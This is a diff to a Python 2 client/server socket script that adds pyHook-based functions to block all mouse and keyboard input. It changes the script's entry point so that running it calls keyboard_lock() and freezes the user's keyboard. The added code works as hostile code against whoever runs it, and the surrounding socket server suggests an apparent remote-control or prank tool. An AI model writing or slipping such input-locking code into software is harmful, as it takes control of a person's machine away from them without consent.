@@ -1,5 +1,6 @@
 import socket
 from threading import Thread
+import pythoncom, pyHook
 
 SERVER_IP = "127.0.0.1"
 PORT = 80
@@ -55,7 +56,6 @@ class ServerFunctions(object):
         while len(client_host_name) < HOST_NAME_LEN_LEN:
             client_host_name += ""
 
-
     def waits_for_data_from_client_to_send_to_the_server(self):
         """
         A function to a thread that waits for data from the client.
@@ -85,7 +85,23 @@ class ServerFunctions(object):
             print data_from_server
 
 
+def lock(event):
+    return False
+
+
+def mouse_lock():
+    hm = pyHook.HookManager()
+    hm.MouseAll = lock
+    hm.HookMouse()
+    pythoncom.PumpMessages()
+
+
+def keyboard_lock():
+    hm = pyHook.HookManager()
+    hm.KeyAll = lock
+    hm.HookKeyboard()
+    pythoncom.PumpMessages()
+
+
 if __name__ == "__main__":
-    #da_clientos = Client()
-    #da_clientos.connecting_to_the_server()
-    #da_clientos.receive_msg_from_server()
+    keyboard_lock()
